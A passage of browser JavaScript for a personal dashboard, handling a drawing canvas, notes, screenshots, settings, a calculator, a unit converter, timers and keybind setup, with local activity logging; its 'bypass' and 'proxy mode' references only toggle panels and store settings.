        document.getElementById('clearCanvasBtn').addEventListener('click', () => {
          this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
          this.ctx.fillStyle = '#fff';
          this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);
          this.drawingHistory = [];
          this.redoHistory = [];
          showNotification('Canvas cleared.');
          trackActivity('CANVAS_ACTION', 'Cleared Canvas');
        });

        undoCanvasBtn.addEventListener('click', () => {
            if (this.drawingHistory.length > 0) {
                const lastStroke = this.drawingHistory.pop(); // Remove last complete stroke
                this.redoHistory.push(lastStroke); // For redo functionality (if added later)

                this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
                this.ctx.fillStyle = '#fff';
                this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height); // Redraw background

                this.drawingHistory.forEach(stroke => {
                    this.ctx.beginPath();
                    this.ctx.moveTo(stroke[0].x, stroke[0].y);
                    this.ctx.strokeStyle = stroke[0].color;
                    this.ctx.lineWidth = stroke[0].thickness;
                    this.ctx.lineCap = 'round';
                    stroke.slice(1).forEach(point => this.ctx.lineTo(point.x, point.y));
                    this.ctx.stroke();
                });
                showNotification('Last drawing stroke undone.');
                trackActivity('CANVAS_ACTION', 'Undid last canvas drawing stroke');
            } else {
                showNotification('Nothing to undo.');
            }
        });

        noteColorPicker.addEventListener('input', (e) => {
            this.currentLineColor = e.target.value;
            trackActivity('CANVAS_ACTION', `Changed pen color to ${this.currentLineColor}`);
        });

        noteThicknessSlider.addEventListener('input', (e) => {
            this.currentLineThickness = parseInt(e.target.value);
            trackActivity('CANVAS_ACTION', `Changed pen thickness to ${this.currentLineThickness}`);
        });
        
        // Toggle visibility of the persistent text notes area
        toggleTextNotesBtn.addEventListener('click', () => {
            if (textNotesArea.style.display === 'block') {
                textNotesArea.style.display = 'none';
                toggleTextNotesBtn.textContent = '✍️ Show Text Notes';
                showNotification('Text notes hidden.');
                trackActivity('CANVAS_ACTION', 'Hid text notes area');
                localStorage.setItem(LS_NOTES_TEXT, textNotesArea.value); // Save text when hidden
            } else {
                textNotesArea.style.display = 'block';
                textNotesArea.focus();
                toggleTextNotesBtn.textContent = 'Hide Text Notes';
                showNotification('Text notes shown.');
                trackActivity('CANVAS_ACTION', 'Shown text notes area');
            }
        });

        // Event listener for general text input for stat tracking
        textNotesArea.addEventListener('input', () => {
            textNotesArea.dataset.saved = 'false'; // Mark as unsaved on edit
        });

        downloadTextNotesBtn.addEventListener('click', () => {
            const textContent = textNotesArea.value;
            if (textContent.trim() === '') {
                showNotification('No text notes to download.');
                return;
            }
            const blob = new Blob([textContent], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'dashboard_text_notes.txt';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            showNotification('Text notes downloaded!');
            trackActivity('CANVAS_ACTION', 'Downloaded text notes');
        });

        // Drawing functionality (adapted for history and new settings)
        this.canvas.addEventListener('mousedown', (e) => {
          this.drawing = true;
          const pos = this.getPos(e);
          this.ctx.beginPath();
          this.ctx.moveTo(pos.x, pos.y);
          // Store first point with current drawing settings for this stroke
          this.drawingHistory.push([{ x: pos.x, y: pos.y, color: this.currentLineColor, thickness: this.currentLineThickness }]);
          this.redoHistory = []; // Clear redo history on new drawing activity
          e.preventDefault();
        });

        this.canvas.addEventListener('mousemove', (e) => {
          if (!this.drawing) return;
          const pos = this.getPos(e);
          this.ctx.lineTo(pos.x, pos.y);
          this.ctx.strokeStyle = this.currentLineColor;
          this.ctx.lineWidth = this.currentLineThickness;
          this.ctx.lineCap = 'round';
          this.ctx.stroke();
          // Add subsequent points to the current stroke in history
          this.drawingHistory[this.drawingHistory.length - 1].push({ x: pos.x, y: pos.y });
          e.preventDefault();
        });

        ['mouseup', 'mouseleave'].forEach(evtName => {
          this.canvas.addEventListener(evtName, () => {
            this.drawing = false;
          });
        });

        // Touch event handlers (adjusted for drawing history) - same logic as mouse
        this.canvas.addEventListener('touchstart', (e) => {
          this.drawing = true;
          const pos = this.getPos(e);
          this.ctx.beginPath();
          this.ctx.moveTo(pos.x, pos.y);
          this.drawingHistory.push([{ x: pos.x, y: pos.y, color: this.currentLineColor, thickness: this.currentLineThickness }]);
          this.redoHistory = [];
          e.preventDefault();
        });

        this.canvas.addEventListener('touchmove', (e) => {
          if (!this.drawing) return;
          const pos = this.getPos(e);
          this.ctx.lineTo(pos.x, pos.y);
          this.ctx.strokeStyle = this.currentLineColor;
          this.ctx.lineWidth = this.currentLineThickness;
          this.ctx.lineCap = 'round';
          this.ctx.stroke();
          this.drawingHistory[this.drawingHistory.length - 1].push({ x: pos.x, y: pos.y });
          e.preventDefault();
        });

        ['touchend', 'touchcancel'].forEach(evtName => {
          this.canvas.addEventListener(evtName, () => {
            this.drawing = false;
          });
        });


        document.getElementById('screenshotBtn').addEventListener('click', () => {
          const elementToCapture = document.body; 
          html2canvas(elementToCapture, { scale: window.devicePixelRatio || 1 }).then(canvasImg => { // Improved quality screenshot
            const link = document.createElement('a');
            link.download = `dashboard_screenshot_${new Date().toISOString()}.png`;
            link.href = canvasImg.toDataURL('image/png');
            link.click();
            updateStats('screenshotsTaken');
            showNotification('Screenshot taken!');
            trackActivity('DASHBOARD_ACTION', 'Screenshot taken');
          });
        });
        
        // Export canvas only
        document.getElementById('exportNotesBtn').addEventListener('click', () => {
          const link = document.createElement('a');
          link.download = `notes_canvas_${new Date().toISOString()}.png`;
          link.href = this.canvas.toDataURL('image/png');
          link.click();
          showNotification('Notes canvas exported!');
          trackActivity('CANVAS_ACTION', 'Exported canvas notes as PNG');
        });

        const toggleBtn = document.getElementById('toggleSectionsBtn');
        toggleBtn.addEventListener('click', () => {
          if (mainGrid.style.display === 'none') {
            mainGrid.style.display = 'flex';
            updatesNotifications.style.display = 'flex';
            toggleBtn.innerText = '⬆️ Toggle Sections';
            showNotification('Dashboard sections shown.');
            trackActivity('DASHBOARD_TOGGLE', 'Panels sections toggled ON');
          } else {
            mainGrid.style.display = 'none';
            updatesNotifications.style.display = 'none';
            toggleBtn.innerText = '⬇️ Toggle Sections';
            showNotification('Dashboard sections hidden.');
            trackActivity('DASHBOARD_TOGGLE', 'Panels sections toggled OFF');
          }
        });
      },
      getPos: function(evt) {
          const rect = this.canvas.getBoundingClientRect();
          // Adjust for any global zoom applied to body
          const currentZoom = parseFloat(document.body.style.zoom || '1');
          const scaleX = this.canvas.width / (rect.width * currentZoom);
          const scaleY = this.canvas.height / (rect.height * currentZoom);
          return {
            x: ((evt.clientX || evt.touches[0].clientX) - rect.left) * scaleX,
            y: ((evt.clientY || evt.touches[0].clientY) - rect.top) * scaleY
          };
      },

      initRandomContent: function() {
        const randomFacts = [
            "A group of owls is called a parliament.",
            "Honey never spoils.",
            "The shortest war in history was between Britain and Zanzibar on August 27, 1896. Zanzibar surrendered after 38 minutes.",
            "There are more possible iterations of a game of chess than there are atoms in the known universe.",
            "Octopuses have three hearts.",
            "The human nose can remember 50,000 different scents.",
            "Flamingos can only eat with their heads upside down.",
            "The Great Wall of China is not visible from the moon with the naked eye.",
            "A cloud can weigh more than a million pounds.",
            "Wombat poop is cube-shaped."
        ];
        const dailyQuotes = [
            { text: "The only way to do great work is to love what you do.", author: "Steve Jobs" },
            { text: "Believe you can and you're halfway there.", author: "Theodore Roosevelt" },
            { text: "The future belongs to those who believe in the beauty of their dreams.", author: "Eleanor Roosevelt" },
            { text: "Strive not to be a success, but rather to be of value.", author: "Albert Einstein" },
            { text: "The mind is everything. What you think you become.", author: "Buddha" },
            { text: "The only limit to our realization of tomorrow will be our doubts of today.", author: "Franklin D. Roosevelt" },
            { text: "It is our choices, Harry, that show what we truly are, far more than our abilities.", author: "J.K. Rowling" },
            { text: "Life is what happens when you're busy making other plans.", author: "John Lennon" },
            { text: "The best way to predict the future is to create it.", author: "Peter Drucker" },
            { text: "Twenty years from now you will be more disappointed by the things that you didn't do than by the ones you did do.", author: "Mark Twain" }
        ];

        const randomFactEl = document.getElementById('randomFactContent');
        const dailyQuoteEl = document.getElementById('dailyQuoteContent');

        if (randomFactEl) {
            randomFactEl.textContent = randomFacts[Math.floor(Math.random() * randomFacts.length)];
            setInterval(() => { // Rotate fact every 30 seconds
                randomFactEl.textContent = randomFacts[Math.floor(Math.random() * randomFacts.length)];
                trackActivity('DASHBOARD_CONTENT', 'Random fact updated');
            }, 30000);
        }
        if (dailyQuoteEl) {
            const quote = dailyQuotes[Math.floor(Math.random() * dailyQuotes.length)];
            dailyQuoteEl.textContent = `"${quote.text}" - ${quote.author}`;
            setInterval(() => { // Rotate quote every 60 seconds
                const newQuote = dailyQuotes[Math.floor(Math.random() * dailyQuotes.length)];
                dailyQuoteEl.textContent = `"${newQuote.text}" - ${newQuote.author}`;
                trackActivity('DASHBOARD_CONTENT', 'Daily quote updated');
            }, 60000);
        }
      },
      
      // Hides all info-panels and content areas initially
      initPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => {
          panel.style.display = 'none';
        });
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
      },

      // Opens a specific panel by ID
      openPanelById: function(panelId) {
          const panel = document.getElementById(panelId);
          if (panel && panel.classList.contains('info-panel')) {
              panel.style.display = 'block';
              updateStats('panelsOpened');
              trackActivity('DASHBOARD_PANEL_OPEN', `Opened panel: ${panelId}`);
          } else if (panel) { // Allow opening non-info-panel boxes explicitly by ID as well
              // For boxes that aren't info-panels but might be hidden, e.g. from toggle sections button
              // This is currently handled by the search, which scrolls, so just opening it as block.
              // Note: Toggle sections functionality in `initCanvas` would reveal these.
          }
      },
      
      // Toggles visibility of a specific info-panel
      togglePanel: function(panelId) {
        const panel = document.getElementById(panelId);
        if (!panel) return;
        
        const wasOpen = panel.style.display === 'block';

        // Close all other info-panels
        document.querySelectorAll('.info-panel').forEach(p => {
            if (p.id !== panelId && p.style.display === 'block') {
                p.style.display = 'none';
                updateStats('panelsClosed');
                trackActivity('DASHBOARD_PANEL_CLOSE', `Closed panel: ${p.id}`);
            }
        });
        
        // Toggle the requested panel
        panel.style.display = wasOpen ? 'none' : 'block';

        if (!wasOpen) {
            updateStats('panelsOpened');
            trackActivity('DASHBOARD_PANEL_OPEN', `Opened panel: ${panelId}`);
        } else {
            updateStats('panelsClosed');
            trackActivity('DASHBOARD_PANEL_CLOSE', `Closed panel: ${panelId}`);
        }
        if (panelId === 'loginHistoryPanel') { // Special render for login history
            this.renderLoginHistory();
        } else if (panelId === 'activityLogsDashboardPanel') {
            renderActivityLogs('dashboardActivityLogs');
        } else if (panelId === 'statsPanel') {
            renderDashboardStats();
        }
        showNotification(`${panelId.replace(/Panel|Box/g, ' ').trim()} ${wasOpen ? 'Closed' : 'Opened'}`);
      },
      
      // Shows specific content for iPad panel
      showIpadContent: function(contentId) {
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1)).style.display = 'block';
        trackActivity('DASHBOARD_ACTION', `Viewed iPad ${contentId} content`);
      },
      
      // Shows specific content for Bypass panel
      showBypassContent: function(contentId) {
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById(contentId + 'Bypass').style.display = 'block';
        trackActivity('DASHBOARD_ACTION', `Viewed bypass ${contentId} content`);
      },

      // Renders the login history panel with data from local storage
      renderLoginHistory: function() {
          const historyContainer = document.getElementById('loginHistoryPanelContent');
          if (historyContainer) {
              historyContainer.innerHTML = '';
              const loginHistory = JSON.parse(localStorage.getItem(LS_LOGIN_HISTORY) || '[]');
              if (loginHistory.length === 0) {
                  historyContainer.innerHTML = '<p style="color:#aaa; padding: 10px;">No login history yet.</p>';
              } else {
                  // Render in reverse chronological order
                  loginHistory.slice().reverse().forEach(entry => {
                      const div = document.createElement('div');
                      div.className = 'activity-log-entry';
                      div.textContent = `[${new Date(entry.timestamp).toLocaleString()}] User: ${entry.user}, ID: ${entry.id}`;
                      historyContainer.appendChild(div);
                  });
              }
          }
      },

      // Initializes settings panel and its interactions
      initSettingsPanel: function() {
        const settingsBtn = document.getElementById('settingsBtn');
        settingsBtn.addEventListener('click', () => {
            dashboard.togglePanel('settingsPanel');
            trackActivity('DASHBOARD_ACTION', 'Opened Settings panel');
        });

        const themeSelect = document.getElementById('themeSelect');
        if (themeSelect) {
            themeSelect.addEventListener('change', (e) => {
                const selectedTheme = e.target.value;
                document.body.classList.remove('dark-theme', 'light-theme', 'blue-theme');
                if (selectedTheme !== 'dark-theme') {
                    document.body.classList.add(selectedTheme);
                    localStorage.setItem(LS_THEME, selectedTheme);
                } else {
                    localStorage.removeItem(LS_THEME); // Implicitly means dark-theme
                }
                trackActivity('DASHBOARD_SETTINGS', `Changed theme to: ${selectedTheme}`);
                this.loadThemes(); // Update the quick-bar theme button text as well
            });
        }

        const toggleAnnouncements = document.getElementById('toggleAnnouncements');
        if (toggleAnnouncements) {
            const savedState = localStorage.getItem('announcementBarEnabled');
            toggleAnnouncements.checked = (savedState === null || savedState === 'true');
            document.getElementById('announcementBar').style.display = toggleAnnouncements.checked ? 'block' : 'none';

            toggleAnnouncements.addEventListener('change', (e) => {
                document.getElementById('announcementBar').style.display = e.target.checked ? 'block' : 'none';
                localStorage.setItem('announcementBarEnabled', e.target.checked);
                trackActivity('DASHBOARD_SETTINGS', `Announcements toggled ${e.target.checked ? 'on' : 'off'}`);
            });
        }
        
        const toggleWelcomeNotification = document.getElementById('toggleWelcomeNotification');
        if (toggleWelcomeNotification) {
            const savedState = localStorage.getItem(LS_WELCOME_NOTIFICATION_DISPLAY);
            toggleWelcomeNotification.checked = (savedState === null || savedState === 'true');

            toggleWelcomeNotification.addEventListener('change', (e) => {
                localStorage.setItem(LS_WELCOME_NOTIFICATION_DISPLAY, e.target.checked);
                trackActivity('DASHBOARD_SETTINGS', `Welcome notification toggled ${e.target.checked ? 'on' : 'off'}`);
            });
        }

        // Reset Layout Button (uses Interact.js API)
        const resetLayoutBtn = document.getElementById('resetLayoutBtn');
        if (resetLayoutBtn) {
            resetLayoutBtn.addEventListener('click', () => {
                if (confirm('Are you sure you want to reset dashboard panel positions and sizes?')) {
                    interact('.box').each(function (element) {
                        element.style.width = ''; // Clear width
                        element.style.height = ''; // Clear height
                        element.style.transform = 'translate(0px, 0px)'; // Reset transform
                        delete element.dataset.x;
                        delete element.dataset.y;
                    });
                    showNotification('Dashboard layout reset to default!');
                    trackActivity('DASHBOARD_SETTINGS', 'Reset dashboard layout');
                }
            });
        }
        
        // Auto Logout Inactive (dummy implementation with value persistence)
        const autoLogoutInput = document.getElementById('autoLogoutInactive');
        if (autoLogoutInput) {
            autoLogoutInput.value = localStorage.getItem(LS_AUTO_LOGOUT_INACTIVE) || '';
            autoLogoutInput.addEventListener('change', (e) => {
                const value = parseInt(e.target.value);
                if (isNaN(value) || value < 0) {
                    showNotification('Please enter a valid number of minutes for auto-logout.');
                    e.target.value = '';
                    localStorage.removeItem(LS_AUTO_LOGOUT_INACTIVE);
                } else {
                    localStorage.setItem(LS_AUTO_LOGOUT_INACTIVE, value);
                    showNotification(`Auto-logout set to ${value} minutes.`);
                    trackActivity('DASHBOARD_SETTINGS', `Auto-logout inactive set to "${value} min"`);
                }
            });
        }

        // All new toggle settings now use `localStorage`
        document.getElementById('enableKeyboardShortcuts').addEventListener('change', (e) => {
            localStorage.setItem('enableKeyboardShortcuts', e.target.checked);
            trackActivity('DASHBOARD_SETTINGS', `Keyboard shortcuts toggled ${e.target.checked ? 'on' : 'off'}`);
            showNotification(`Keyboard shortcuts ${e.target.checked ? 'enabled' : 'disabled'}.`);
        });
        document.getElementById('notificationSound').addEventListener('change', (e) => {
            localStorage.setItem('notificationSound', e.target.checked);
            trackActivity('DASHBOARD_SETTINGS', `Notification sound toggled ${e.target.checked ? 'on' : 'off'}`);
            showNotification(`Notification sounds ${e.target.checked ? 'enabled' : 'disabled'}.`);
        });
        document.getElementById('advancedLogging').addEventListener('change', (e) => {
            localStorage.setItem('advancedLogging', e.target.checked);
            trackActivity('DASHBOARD_SETTINGS', `Advanced logging toggled ${e.target.checked ? 'on' : 'off'}`);
            showNotification(`Advanced logging ${e.target.checked ? 'enabled' : 'disabled'}.`);
        });
        document.getElementById('performanceMode').addEventListener('change', (e) => {
            localStorage.setItem('performanceMode', e.target.checked);
            trackActivity('DASHBOARD_SETTINGS', `Performance mode toggled ${e.target.checked ? 'on' : 'off'}`);
            showNotification(`Performance mode ${e.target.checked ? 'enabled' : 'disabled'}.`);
        });
        document.getElementById('proxyMode').addEventListener('change', (e) => {
            localStorage.setItem('proxyMode', e.target.checked);
            trackActivity('DASHBOARD_SETTINGS', `Proxy mode toggled ${e.target.checked ? 'on' : 'off'}`);
            showNotification(`Proxy mode ${e.target.checked ? 'enabled' : 'disabled'} (requires refresh).`);
        });

        // Load all toggle states on panel open
        document.querySelectorAll('#settingsPanel input[type="checkbox"]').forEach(checkbox => {
            const savedState = localStorage.getItem(checkbox.id);
            if (savedState !== null) {
                checkbox.checked = JSON.parse(savedState);
            }
        });
      },

      // Initializes Calculator functionality
      initCalculator: function() {
        const calculatorBtn = document.getElementById('calculatorBtn');
        calculatorBtn.addEventListener('click', () => {
            dashboard.togglePanel('calculatorPanel');
            trackActivity('DASHBOARD_ACTION', 'Opened Calculator');
        });

        const calc = {
          displayValue: '0',
          firstOperand: null,
          waitingForSecondOperand: false,
          operator: null,

          updateDisplay: function() {
            document.getElementById('calcDisplay').textContent = this.displayValue;
          },

          inputDigit: function(digit) {
            if (this.waitingForSecondOperand === true) {
              this.displayValue = digit;
              this.waitingForSecondOperand = false;
            } else {
              this.displayValue = this.displayValue === '0' ? digit : this.displayValue + digit;
            }
            this.updateDisplay();
          },

          inputDecimal: function(dot) {
            if (this.waitingForSecondOperand === true) {
                this.displayValue = '0.';
                this.waitingForSecondOperand = false;
                this.updateDisplay();
                return;
            }
            if (!this.displayValue.includes(dot)) {
              this.displayValue += dot;
            }
            this.updateDisplay();
          },

          handleOperator: function(nextOperator) {
            const inputValue = parseFloat(this.displayValue);

            if (this.operator && this.waitingForSecondOperand)  {
              this.operator = nextOperator;
              return;
            }

            if (this.firstOperand === null && !isNaN(inputValue)) {
              this.firstOperand = inputValue;
            } else if (this.operator) {
              const result = this.operate(this.firstOperand, inputValue, this.operator);
              this.displayValue = String(parseFloat(result.toFixed(7)));
              this.firstOperand = result;
            }

            this.waitingForSecondOperand = true;
            this.operator = nextOperator;
            this.updateDisplay();
            trackActivity('CALCULATOR_ACTION', `Entered operator ${nextOperator}`);
          },

          operate: function(firstOperand, secondOperand, operator) {
            if (operator === '+') return firstOperand + secondOperand;
            if (operator === '-') return firstOperand - secondOperand;
            if (operator === '*') return firstOperand * secondOperand;
            if (operator === '/') {
                if (secondOperand === 0) {
                    showNotification("Error: Division by zero.");
                    return NaN; // Indicate error
                }
                return firstOperand / secondOperand;
            }
            if (operator === '%') return firstOperand % secondOperand;
            return secondOperand;
          },

          calculate: function() {
            if (this.firstOperand === null || this.operator === null || this.waitingForSecondOperand) {
                return;
            }

            const secondOperand = parseFloat(this.displayValue);
            const result = this.operate(this.firstOperand, secondOperand, this.operator);

            if (isNaN(result)) { // Handle division by zero or other errors
                this.displayValue = 'Error';
            } else {
                this.displayValue = String(parseFloat(result.toFixed(7)));
            }
            
            this.firstOperand = null;
            this.waitingForSecondOperand = true;
            this.operator = null;
            this.updateDisplay();
            trackActivity('CALCULATOR_ACTION', `Calculated result: ${this.displayValue}`);
          },

          clear: function() {
            this.displayValue = '0';
            this.firstOperand = null;
            this.waitingForSecondOperand = false;
            this.operator = null;
            this.updateDisplay();
            trackActivity('CALCULATOR_ACTION', 'Cleared calculator');
          },

          deleteLast: function() {
              this.displayValue = this.displayValue.slice(0, -1);
              if (this.displayValue === '') {
                  this.displayValue = '0';
              }
              this.updateDisplay();
              trackActivity('CALCULATOR_ACTION', 'Deleted last character');
          },
          
          appendNum: function(num) {
              this.inputDigit(num);
          },
          
          appendOp: function(op) {
              this.handleOperator(op);
          }
        };

        window.calculator = calc;

        const calculatorGrid = document.querySelector('#calculatorPanel .calculator-grid');
        calculatorGrid.addEventListener('click', (event) => {
            const { target } = event;
            if (!target.matches('button')) return;

            if (target.classList.contains('operator')) {
                calc.handleOperator(target.textContent);
            } else if (target.classList.contains('equal')) {
                calc.calculate();
            } else if (target.textContent === 'AC') {
                calc.clear();
            } else if (target.textContent === 'DEL') {
                calc.deleteLast();
            } else if (target.textContent === '.') {
                calc.inputDecimal('.');
            } else {
                calc.inputDigit(target.textContent);
            }
        });

        calc.updateDisplay();
      },

      // Initializes Unit Converter
      initUnitConverter: function() {
        const converterBtn = document.getElementById('unitConverterBtn');
        converterBtn.addEventListener('click', () => {
            dashboard.togglePanel('unitConverterPanel');
            trackActivity('DASHBOARD_ACTION', 'Opened Unit Converter');
        });

        const units = {
            length: {
                m: { name: 'Meter', to_m: 1 }, km: { name: 'Kilometer', to_m: 1000 }, cm: { name: 'Centimeter', to_m: 0.01 },
                mm: { name: 'Millimeter', to_m: 0.001 }, mi: { name: 'Mile', to_m: 1609.34 }, yd: { name: 'Yard', to_m: 0.9144 },
                ft: { name: 'Foot', to_m: 0.3048 }, in: { name: 'Inch', to_m: 0.0254 }
            },
            mass: {
                kg: { name: 'Kilogram', to_kg: 1 }, g: { name: 'Gram', to_kg: 0.001 }, mg: { name: 'Milligram', to_kg: 0.000001 },
                lb: { name: 'Pound', to_kg: 0.453592 }, oz: { name: 'Ounce', to_kg: 0.0283495 }
            },
            temperature: {
                c: { name: 'Celsius', to_c: (v) => v, from_c: (v) => v },
                f: { name: 'Fahrenheit', to_c: (v) => (v - 32) * 5 / 9, from_c: (v) => (v * 9 / 5) + 32 },
                k: { name: 'Kelvin', to_c: (v) => v - 273.15, from_c: (v) => v + 273.15 }
            },
            volume: {
                l: { name: 'Liter', to_l: 1 }, ml: { name: 'Milliliter', to_l: 0.001 }, gal: { name: 'Gallon (US)', to_l: 3.78541 },
                qt: { name: 'Quart (US)', to_l: 0.946353 }, cup: { name: 'Cup (US)', to_l: 0.236588 }
            },
            area: { // Added Area as new conversion type
                sqm: { name: 'Square Meter', to_sqm: 1 }, sqkm: { name: 'Square Kilometer', to_sqm: 1e6 },
                sqft: { name: 'Square Foot', to_sqm: 0.092903 }, sqmi: { name: 'Square Mile', to_sqm: 2.58999e6 },
                acre: { name: 'Acre', to_sqm: 4046.86 }
            }
        };

        const conversionTypeSelect = document.getElementById('conversionType');
        const convertFromUnitSelect = document.getElementById('convertFromUnit');
        const convertToUnitSelect = document.getElementById('convertToUnit');
        const convertFromValueInput = document.getElementById('convertFromValue');
        const conversionResultDiv = document.getElementById('conversionResult');
        const convertButton = document.getElementById('convertBtn');

        function populateUnitDropdowns(type) {
            const currentUnits = units[type];
            convertFromUnitSelect.innerHTML = '';
            convertToUnitSelect.innerHTML = '';
            for (const key in currentUnits) {
                const optionFrom = document.createElement('option');
                optionFrom.value = key;
                optionFrom.textContent = currentUnits[key].name;
                convertFromUnitSelect.appendChild(optionFrom);

                const optionTo = document.createElement('option');
                optionTo.value = key;
                optionTo.textContent = currentUnits[key].name;
                convertToUnitSelect.appendChild(optionTo);
            }
            if (convertFromUnitSelect.options.length > 0) convertFromUnitSelect.value = Object.keys(currentUnits)[0];
            if (convertToUnitSelect.options.length > 1) convertToUnitSelect.value = Object.keys(currentUnits)[1];
            else if (convertToUnitSelect.options.length > 0) convertToUnitSelect.value = Object.keys(currentUnits)[0];
        }

        function performConversion() {
            const type = conversionTypeSelect.value;
            const fromUnitKey = convertFromUnitSelect.value;
            const toUnitKey = convertToUnitSelect.value;
            const value = parseFloat(convertFromValueInput.value);

            if (isNaN(value)) {
                conversionResultDiv.textContent = 'Please enter a valid number.';
                return;
            }

            const fromUnit = units[type][fromUnitKey];
            const toUnit = units[type][toUnitKey];

            let result;
            if (type === 'temperature') {
                const valueInC = fromUnit.to_c(value);
                result = toUnit.from_c(valueInC);
            } else {
                const baseUnitKey = `to_`;
                const unitMap = { 'length': 'm', 'mass': 'kg', 'volume': 'l', 'area': 'sqm' };
                const conversionBase = unitMap[type];

                const valueInBase = value * fromUnit[baseUnitKey + conversionBase];
                result = valueInBase / toUnit[baseUnitKey + conversionBase];
            }
            
            conversionResultDiv.textContent = `Result: ${result.toFixed(5)} ${toUnit.name}`;
            trackActivity('UNIT_CONVERTER_ACTION', `Converted ${value} ${fromUnit.name} to ${toUnit.name}`);
            updateStats('conversionsMade');
        }

        conversionTypeSelect.addEventListener('change', (e) => {
            populateUnitDropdowns(e.target.value);
            performConversion();
        });
        convertFromValueInput.addEventListener('input', performConversion);
        convertFromUnitSelect.addEventListener('change', performConversion);
        convertToUnitSelect.addEventListener('change', performConversion);
        convertButton.addEventListener('click', performConversion);

        populateUnitDropdowns('length');
        performConversion();
      },

      // Initializes timer and stopwatch functionalities
      initUtilities: function() {
        const utilitiesBtn = document.getElementById('utilitiesBtn');
        utilitiesBtn.addEventListener('click', () => {
            dashboard.togglePanel('utilitiesPanel');
            trackActivity('DASHBOARD_ACTION', 'Opened Utilities panel');
        });

        // Stopwatch logic
        let stopwatchInterval;
        let stopwatchSeconds = 0;
        const stopwatchDisplay = document.getElementById('stopwatchDisplay');
        const stopwatchStartBtn = document.getElementById('stopwatchStart');
        const stopwatchStopBtn = document.getElementById('stopwatchStop');
        const stopwatchResetBtn = document.getElementById('stopwatchReset');

        function formatStopwatchTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }

        stopwatchStartBtn.addEventListener('click', () => {
            if (!stopwatchInterval) {
                stopwatchInterval = setInterval(() => {
                    stopwatchSeconds++;
                    stopwatchDisplay.textContent = formatStopwatchTime(stopwatchSeconds);
                }, 1000);
                showNotification('Stopwatch started!');
                trackActivity('UTILITIES_ACTION', 'Stopwatch started');
                updateStats('stopwatchStarts');
            }
        });
        stopwatchStopBtn.addEventListener('click', () => {
            clearInterval(stopwatchInterval);
            stopwatchInterval = null;
            showNotification('Stopwatch stopped.');
            trackActivity('UTILITIES_ACTION', 'Stopwatch stopped');
        });
        stopwatchResetBtn.addEventListener('click', () => {
            clearInterval(stopwatchInterval);
            stopwatchInterval = null;
            stopwatchSeconds = 0;
            stopwatchDisplay.textContent = '00:00:00';
            showNotification('Stopwatch reset.');
            trackActivity('UTILITIES_ACTION', 'Stopwatch reset');
        });

        // Countdown Timer logic
        let timerInterval;
        let totalTimerSeconds = 0;
        const timerDisplay = document.getElementById('timerDisplay');
        const timerMinutesInput = document.getElementById('timerMinutes');
        const timerSecondsInput = document.getElementById('timerSeconds');
        const timerStartBtn = document.getElementById('timerStart');
        const timerStopBtn = document.getElementById('timerStop');
        const timerResetBtn = document.getElementById('timerReset');

        function formatTimerTime(seconds) {
            const mins = String(Math.floor(seconds / 60)).padStart(2, '0');
            const secs = String(seconds % 60).padStart(2, '0');
            return `${mins}:${secs}`;
        }

        function setInitialTimer() {
            totalTimerSeconds = (parseInt(timerMinutesInput.value) || 0) * 60 + (parseInt(timerSecondsInput.value) || 0);
            timerDisplay.textContent = formatTimerTime(totalTimerSeconds);
        }
        setInitialTimer();

        timerMinutesInput.addEventListener('input', setInitialTimer);
        timerSecondsInput.addEventListener('input', setInitialTimer);

        timerStartBtn.addEventListener('click', () => {
            if (!timerInterval && totalTimerSeconds > 0) {
                timerInterval = setInterval(() => {
                    totalTimerSeconds--;
                    timerDisplay.textContent = formatTimerTime(totalTimerSeconds);
                    if (totalTimerSeconds <= 0) {
                        clearInterval(timerInterval);
                        timerInterval = null;
                        timerDisplay.textContent = '00:00';
                        showNotification('Countdown Timer Finished!');
                        trackActivity('UTILITIES_ALERT', 'Countdown timer finished');
                        updateStats('timerStarts');
                    }
                }, 1000);
                showNotification(`Countdown timer started for ${formatTimerTime(totalTimerSeconds)}!`);
                trackActivity('UTILITIES_ACTION', 'Countdown timer started');
            } else if (totalTimerSeconds <= 0) {
                 showNotification('Please set a duration for the timer.');
            }
        });
        timerStopBtn.addEventListener('click', () => {
            clearInterval(timerInterval);
            timerInterval = null;
            showNotification('Countdown timer stopped.');
            trackActivity('UTILITIES_ACTION', 'Countdown timer stopped');
        });
        timerResetBtn.addEventListener('click', () => {
            clearInterval(timerInterval);
            timerInterval = null;
            setInitialTimer();
            showNotification('Countdown timer reset.');
            trackActivity('UTILITIES_ACTION', 'Countdown timer reset');
        });
      },

      // Initializes keybinds panel and hotkey listeners
      initKeybindsPanel: function() {
          const keybindsBtn = document.getElementById('keybindsBtn');
          keybindsBtn.addEventListener('click', () => {
              dashboard.togglePanel('keybindsPanel');
              trackActivity('DASHBOARD_ACTION', 'Opened Keybinds panel');
          });

          const keybindInputs = document.querySelectorAll('#keybindsPanel input[type="text"]');
          const saveKeybindsBtn = document.getElementById('saveKeybindsBtn');

          let configuredKeybinds = JSON.parse(localStorage.getItem(LS_KEYBINDS) || '{}');

          function loadKeybinds() {
              keybindInputs.forEach(input => {
                  const action = input.dataset.keybindAction;
                  if (configuredKeybinds[action]) {
                      input.value = configuredKeybinds[action];
                  } else {
                      // Reset to default value if not found in storage
                      input.value = input.defaultValue;
                  }
                  // Allow key recording on focus
                  input.readOnly = true; // Make it readonly initially to capture key events
                  input.addEventListener('focus', () => {
                      showNotification('Press desired keys to configure keybind...');
                      input.value = ''; // Clear for new input
                      let keybindSequence = [];
                      const keyCaptureListener = (e) => {
